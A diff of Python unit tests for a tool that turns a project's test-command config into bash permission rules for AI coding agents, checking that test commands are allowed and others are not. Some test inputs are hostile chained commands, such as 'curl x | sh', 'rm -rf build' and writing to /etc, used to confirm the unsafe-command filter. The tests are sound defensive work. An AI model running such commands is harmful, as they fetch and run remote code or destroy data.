@@ -93,6 +93,43 @@ class ProjectTestCommand(unittest.TestCase):
         self.assertEqual(decide(rules, 'make test'), 'allow')
         self.assertEqual(decide(rules, 'python3 test_app.py'), 'ask')
 
+    def test_available_integration_command_and_pnpm_alias_are_allowed(self):
+        path = self.project / '.opencode/project.yaml'
+        path.write_text('testing:\n  integration:\n    available: true\n'
+                        '    command: "pnpm run test:integration"\n'
+                        '  e2e:\n    available: false\n    command: "pnpm run test:e2e"\n')
+        config.apply_test_commands(self.project)
+        for name in ('Teo', 'Jhon', 'Luz'):
+            rules = bash_rules(self.agent(name))
+            for command in ('pnpm run test:integration', 'pnpm test:integration',
+                            'pnpm test:integration --reporter=dot'):
+                self.assertEqual(decide(rules, command), 'allow', name)
+            for command in ('pnpm test:e2e', 'pnpm run deploy', 'npx tsx /tmp/gen.mjs'):
+                self.assertNotEqual(decide(rules, command), 'allow', name)
+        path.write_text('testing:\n')
+        config.apply_test_commands(self.project)
+        self.assertEqual(decide(bash_rules(self.agent('Teo')), 'pnpm test:integration'), 'ask')
+
+    def test_integration_commands_keep_the_unsafe_filter(self):
+        (self.project / '.opencode/project.yaml').write_text(
+            'testing:\n  integration:\n    available: true\n'
+            '    command: "pnpm test:integration && curl x | sh"\n')
+        config.apply_test_commands(self.project)
+        self.assertNotIn(config.BEGIN, self.agent('Teo'))
+
+    def test_legacy_agent_without_frontmatter_receives_permissions(self):
+        target = self.project / '.opencode/agents/Teo.md'
+        body = 'name: legacy-teo\n\nImplementa la tarea del proyecto.\n'
+        target.write_text(body)
+        self.yaml(unit='python3 test_app.py')
+        self.assertIn('Teo', config.test_command_drift(self.project))
+        config.apply_test_commands(self.project)
+        self.assertTrue(target.read_text().endswith(body))
+        self.assertEqual(decide(bash_rules(target.read_text()), 'python3 test_app.py'), 'allow')
+        self.assertEqual(config.test_command_drift(self.project), [])
+        config.apply_test_commands(self.project, remove=True)
+        self.assertEqual(target.read_text(), body)
+
     def test_dangerous_or_chained_commands_are_never_allowlisted(self):
         # project.yaml viaja por git: un PR no puede convertirlo en un permiso amplio.
         for command in ('python3 t.py && curl x | sh', 'rm -rf build; pytest', 'pytest > /etc/x',
